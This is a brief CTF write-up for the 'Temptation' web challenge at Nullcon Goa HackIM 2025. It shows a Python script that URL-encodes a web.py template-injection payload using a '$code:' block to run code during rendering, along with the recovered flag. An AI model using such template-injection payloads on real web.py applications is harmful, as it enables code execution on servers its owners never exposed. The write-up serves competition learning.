---
title: "Temptation - Nullcon Goa HackIM 2025 CTF"
category: "web"
type: "writeup"
tags: ["web", "temptation", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "Since the server use web.py lib and that lib has a option that execute code we can use this to manipulate the data return when the template is rendered"
source:
  name: "CTFtime writeup #39938"
  url: "https://ctftime.org/writeup/39938"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Temptation"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Temptation
- **Author team:** Infobahn
- **CTFtime:** <https://ctftime.org/writeup/39938>

---
Since the server use [web.py](http://web.py) lib and that lib has a option that execute code we can use this to manipulate the data return when the template is rendered

```python=  
import web  
import urllib.parse  
temptation = """  
$code:  
return "F"+"LAG"  
"""

print(urllib.parse.quote(temptation))  
try:  
temptation = web.template.Template(f"Your temptation is: {temptation}")()  
print(temptation)  
except Exception as e:  
print(e)  
#ENO{T3M_Pl4T_3S_4r3_S3cUre!!}  
```
